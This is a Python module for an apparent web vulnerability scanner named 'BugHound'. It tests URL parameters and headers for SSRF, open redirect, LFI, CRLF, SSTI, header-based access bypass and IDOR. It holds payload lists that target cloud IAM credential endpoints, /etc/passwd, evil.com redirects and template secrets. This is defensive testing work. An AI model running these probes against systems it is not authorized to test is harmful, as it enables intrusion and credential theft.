"""Pure-Python injection tester — value fuzzing via aiohttp.

Handles SSRF, open redirect, LFI, CRLF, SSTI, header injection, and IDOR
testing without external binaries. Each test replaces a parameter value with
payloads and checks response for vulnerability indicators.
"""

from __future__ import annotations

import asyncio
import hashlib
import re
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import aiohttp
import structlog

logger = structlog.get_logger()

_TIMEOUT = aiohttp.ClientTimeout(total=15)
_HEADERS = {"User-Agent": "Mozilla/5.0 (BugHound Scanner)"}


# ---------------------------------------------------------------------------
# URL parameter replacement helper
# ---------------------------------------------------------------------------


def _replace_param(url: str, param: str, new_value: str) -> str:
    """Replace a query parameter value in a URL (qsreplace logic)."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        # Append the parameter if not present
        sep = "&" if parsed.query else ""
        new_query = f"{parsed.query}{sep}{param}={new_value}"
    else:
        qs[param] = [new_value]
        new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


async def _send(
    session: aiohttp.ClientSession,
    url: str,
    *,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    allow_redirects: bool = True,
) -> tuple[int, str, dict[str, str]]:
    """Send request, return (status, body, response_headers). Never raises."""
    hdrs = {**_HEADERS, **(headers or {})}
    try:
        async with session.request(
            method, url, headers=hdrs, allow_redirects=allow_redirects,
            ssl=False, timeout=_TIMEOUT,
        ) as resp:
            body = await resp.text(errors="replace")
            resp_headers = {k: v for k, v in resp.headers.items()}
            return resp.status, body[:50_000], resp_headers
    except Exception:
        return 0, "", {}


# ---------------------------------------------------------------------------
# SSRF Testing
# ---------------------------------------------------------------------------

_SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://127.0.0.1",
    "http://[::1]",
    "http://0x7f000001",
    "http://2130706433",
    "http://0177.0.0.1",
    "http://localhost",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
]

_SSRF_INDICATORS = re.compile(
    r"ami-id|instance-id|iam|security-credentials|computeMetadata|"
    r"availabilityZone|privateIp|accountId|instanceType",
    re.I,
)


async def test_ssrf(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test SSRF by injecting cloud metadata and internal URLs."""
    async with aiohttp.ClientSession() as session:
        # Baseline
        baseline_status, baseline_body, _ = await _send(session, target_url)
        baseline_len = len(baseline_body)

        for payload in _SSRF_PAYLOADS:
            test_url = _replace_param(target_url, param, payload)
            status, body, _ = await _send(session, test_url)

            if status == 0:
                continue

            # Check for cloud metadata indicators in response
            if _SSRF_INDICATORS.search(body):
                ssrf_type = "full_ssrf" if "security-credentials" in body else "partial"
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "evidence": body[:500],
                    "type": ssrf_type,
                    "param": param,
                    "url": test_url,
                }

            # Significant response change could indicate blind SSRF
            if abs(len(body) - baseline_len) > 500 and status != baseline_status:
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "evidence": f"Response changed: status {baseline_status}->{status}, size {baseline_len}->{len(body)}",
                    "type": "blind_ssrf",
                    "param": param,
                    "url": test_url,
                }

    return {"vulnerable": False, "param": param, "url": target_url, "type": None}


# ---------------------------------------------------------------------------
# Open Redirect Testing
# ---------------------------------------------------------------------------

_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com@legitimate.com",
    "/%0d%0aLocation:%20https://evil.com",
    "/evil.com",
    "https://legitimate.com.evil.com",
]


async def test_open_redirect(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test open redirect by injecting external URLs."""
    async with aiohttp.ClientSession() as session:
        for payload in _REDIRECT_PAYLOADS:
            test_url = _replace_param(target_url, param, payload)
            status, body, headers = await _send(
                session, test_url, allow_redirects=False,
            )

            if status == 0:
                continue

            location = headers.get("Location", headers.get("location", ""))

            # Check if redirect points to evil.com
            if "evil.com" in location:
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "redirected_to": location,
                    "type": "full_redirect",
                    "param": param,
                    "url": test_url,
                }

            # Partial — redirect to a path we control
            if status in (301, 302, 303, 307, 308) and payload in location:
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "redirected_to": location,
                    "type": "partial_redirect",
                    "param": param,
                    "url": test_url,
                }

    return {"vulnerable": False, "param": param, "url": target_url, "type": None}


# ---------------------------------------------------------------------------
# LFI Testing
# ---------------------------------------------------------------------------

_LFI_PAYLOADS_LINUX = [
    "/etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "/etc/passwd%00",
    "/etc/passwd%00.jpg",
]

_LFI_PAYLOADS_WINDOWS = [
    "C:\\Windows\\win.ini",
    "../../../../../../Windows/win.ini",
    "..\\..\\..\\..\\..\\Windows\\win.ini",
]

_LFI_LINUX_INDICATORS = re.compile(r"root:x:0:0|/bin/bash|/bin/sh|daemon:x:")
_LFI_WINDOWS_INDICATORS = re.compile(r"\[extensions\]|\[fonts\]|for 16-bit app support")


async def test_lfi(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test Local File Inclusion with traversal payloads."""
    async with aiohttp.ClientSession() as session:
        # Test Linux payloads
        for payload in _LFI_PAYLOADS_LINUX:
            test_url = _replace_param(target_url, param, payload)
            status, body, _ = await _send(session, test_url)

            if status == 0:
                continue

            if _LFI_LINUX_INDICATORS.search(body):
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "evidence": body[:500],
                    "os": "linux",
                    "param": param,
                    "url": test_url,
                }

        # Test Windows payloads
        for payload in _LFI_PAYLOADS_WINDOWS:
            test_url = _replace_param(target_url, param, payload)
            status, body, _ = await _send(session, test_url)

            if status == 0:
                continue

            if _LFI_WINDOWS_INDICATORS.search(body):
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "evidence": body[:500],
                    "os": "windows",
                    "param": param,
                    "url": test_url,
                }

    return {"vulnerable": False, "param": param, "url": target_url, "os": None}


# ---------------------------------------------------------------------------
# CRLF Injection Testing
# ---------------------------------------------------------------------------

_CRLF_PAYLOADS = [
    "%0d%0aX-Injected:BugHound",
    "%0AX-Injected:BugHound",
    "%0DX-Injected:BugHound",
    "%E5%98%8A%E5%98%8DX-Injected:BugHound",
]


async def test_crlf(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test CRLF injection by checking for injected headers."""
    async with aiohttp.ClientSession() as session:
        for payload in _CRLF_PAYLOADS:
            # Append payload to the original value
            test_url = _replace_param(target_url, param, original_value + payload)
            status, body, headers = await _send(session, test_url)

            if status == 0:
                continue

            # Check if our injected header appears
            if "X-Injected" in headers:
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "injected_header": f"X-Injected: {headers.get('X-Injected', '')}",
                    "param": param,
                    "url": test_url,
                }

    return {"vulnerable": False, "param": param, "url": target_url}


# ---------------------------------------------------------------------------
# SSTI Testing
# ---------------------------------------------------------------------------

_SSTI_PAYLOADS = [
    ("{{7*7}}", "49", "jinja2"),
    ("${7*7}", "49", "freemarker"),
    ("#{7*7}", "49", "ruby_erb"),
    ("<%= 7*7 %>", "49", "erb"),
    ("{{config}}", "SECRET_KEY", "jinja2"),
    ("{{self.__class__}}", "class", "jinja2"),
]


async def test_ssti(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test Server-Side Template Injection with expression payloads."""
    async with aiohttp.ClientSession() as session:
        # Baseline to filter false positives
        baseline_status, baseline_body, _ = await _send(session, target_url)

        for payload, expected, engine in _SSTI_PAYLOADS:
            test_url = _replace_param(target_url, param, payload)
            status, body, _ = await _send(session, test_url)

            if status == 0:
                continue

            # Check for expected output that wasn't in baseline
            if expected in body and expected not in baseline_body:
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "template_engine": engine,
                    "evidence": body[:500],
                    "param": param,
                    "url": test_url,
                }

    return {
        "vulnerable": False, "param": param, "url": target_url,
        "template_engine": None,
    }


# ---------------------------------------------------------------------------
# Header Injection Testing
# ---------------------------------------------------------------------------


async def test_header_injection(target_url: str) -> dict[str, Any]:
    """Test Host header poisoning, X-Forwarded-For bypass, path override."""
    results: list[dict[str, Any]] = []

    async with aiohttp.ClientSession() as session:
        # Baseline
        baseline_status, baseline_body, _ = await _send(session, target_url)

        # Test 1: Host header poisoning
        status, body, _ = await _send(
            session, target_url, headers={"Host": "evil.com"},
        )
        if status != 0 and "evil.com" in body:
            results.append({
                "technique": "host_header_poisoning",
                "evidence": "Host: evil.com reflected in response body",
                "severity": "high",
            })

        # Test 2: X-Forwarded-For bypass
        status, body, _ = await _send(
            session, target_url, headers={"X-Forwarded-For": "127.0.0.1"},
        )
        if status != 0 and status != baseline_status:
            results.append({
                "technique": "x_forwarded_for_bypass",
                "evidence": f"Response changed: {baseline_status} -> {status}",
                "severity": "medium",
            })

        # Test 3: X-Forwarded-Host reflection
        status, body, _ = await _send(
            session, target_url, headers={"X-Forwarded-Host": "evil.com"},
        )
        if status != 0 and "evil.com" in body:
            results.append({
                "technique": "x_forwarded_host_reflection",
                "evidence": "X-Forwarded-Host: evil.com reflected in response body",
                "severity": "medium",
            })

        # Test 4: X-Original-URL path override
        parsed = urlparse(target_url)
        admin_path = "/admin"
        status_orig, _, _ = await _send(
            session, target_url.replace(parsed.path or "/", admin_path),
        )
        if status_orig in (401, 403):
            status, body, _ = await _send(
                session, target_url,
                headers={"X-Original-URL": admin_path},
            )
            if status == 200 and status_orig in (401, 403):
                results.append({
                    "technique": "x_original_url_bypass",
                    "evidence": f"X-Original-URL: {admin_path} bypassed {status_orig} to 200",
                    "severity": "high",
                })

        # Test 5: X-Rewrite-URL path override
        if status_orig in (401, 403):
            status, body, _ = await _send(
                session, target_url,
                headers={"X-Rewrite-URL": admin_path},
            )
            if status == 200:
                results.append({
                    "technique": "x_rewrite_url_bypass",
                    "evidence": f"X-Rewrite-URL: {admin_path} bypassed {status_orig} to 200",
                    "severity": "high",
                })

    return {
        "vulnerable": bool(results),
        "url": target_url,
        "findings": results,
    }


# ---------------------------------------------------------------------------
# IDOR Testing
# ---------------------------------------------------------------------------


async def test_idor(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test IDOR by manipulating ID values and comparing responses."""
    async with aiohttp.ClientSession() as session:
        # Baseline request
        baseline_status, baseline_body, _ = await _send(session, target_url)
        if baseline_status == 0:
            return {"potential_idor": False, "param": param, "url": target_url, "confidence": "low"}

        baseline_hash = hashlib.md5(baseline_body.encode()).hexdigest()

        # Generate test values based on original
        test_values: list[str] = []
        if original_value.isdigit():
            orig_int = int(original_value)
            test_values = [str(orig_int + 1), str(max(0, orig_int - 1)), "0", "99999"]
        elif len(original_value) > 8 and all(c in "0123456789abcdef-" for c in original_value.lower()):
            # UUID-like — modify last character
            last = original_value[-1]
            new_last = chr(ord(last) + 1) if last != "f" else "0"
            test_values = [original_value[:-1] + new_last]
        else:
            test_values = ["admin", "test", "1"]

        for test_val in test_values:
            test_url = _replace_param(target_url, param, test_val)
            status, body, _ = await _send(session, test_url)

            if status == 0:
                continue

            body_hash = hashlib.md5(body.encode()).hexdigest()

            # Different value returns 200 with different content
            if status == 200 and body_hash != baseline_hash and len(body) > 100:
                confidence = "medium" if original_value.isdigit() else "low"
                return {
                    "potential_idor": True,
                    "original_value": original_value,
                    "tested_value": test_val,
                    "response_diff": f"Different response: hash {baseline_hash[:8]} vs {body_hash[:8]}, size {len(baseline_body)} vs {len(body)}",
                    "confidence": confidence,
                    "param": param,
                    "url": test_url,
                }

    return {
        "potential_idor": False,
        "original_value": original_value,
        "param": param,
        "url": target_url,
        "confidence": "low",
    }
